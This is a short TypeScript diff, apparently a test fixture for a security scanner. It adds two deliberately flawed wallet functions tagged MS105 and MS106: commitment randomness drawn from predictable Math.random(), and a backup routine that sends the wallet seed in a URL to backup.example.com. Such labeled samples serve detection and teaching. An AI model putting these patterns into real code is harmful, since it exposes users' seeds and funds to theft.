@@ -19,3 +19,13 @@ export const walletConfig = {
 export function savePrivateState(privateState: unknown): void {
   localStorage.setItem("voting-private-state", JSON.stringify(privateState));
 }
+
+// MS105: Math.random() is predictable, so this commitment randomness can be guessed.
+export function newBidRandomness(): string {
+  return Math.random().toString(16).slice(2);
+}
+
+// MS106: the seed is sent to a server, which can read and log it.
+export async function backupWallet(seed: string): Promise<void> {
+  await fetch(`https://backup.example.com/save?seed=${seed}`);
+}
